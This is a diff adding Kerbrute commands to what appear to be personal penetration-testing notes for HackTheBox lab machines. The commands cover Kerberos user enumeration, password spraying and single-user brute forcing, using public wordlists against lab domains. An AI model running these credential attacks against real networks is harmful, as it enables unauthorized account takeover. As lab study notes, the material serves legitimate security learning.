@@ -72,3 +72,32 @@ Domain Name - scrm.local
 SPN         - The Service Principal Name - can be obtained with GetUserSPN.py
 User Id     - uid 500
 ```
+
+
+## Kerbrute
+
+Using kerbrute for user enumeration
+```bash
+kerbrute userenum \
+    -d scrm.local \
+    --dc scrambled.htb \
+    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+Using kerbrute for password spraying, meaning try 1 same password on a bunch of known users
+```bash
+kerbrute passwordspray \
+    -d scrm.local \
+    --dc scrambled.htb \
+    ./users.txt \
+    ksimpson
+```
+
+Using kerbrute to bruteforce a specific user
+```bash
+kerbrute bruteuser \
+    -d authority.htb \
+    --dc authority.htb \
+    /usr/share/wordlists/rockyou.txt authority
+```
+
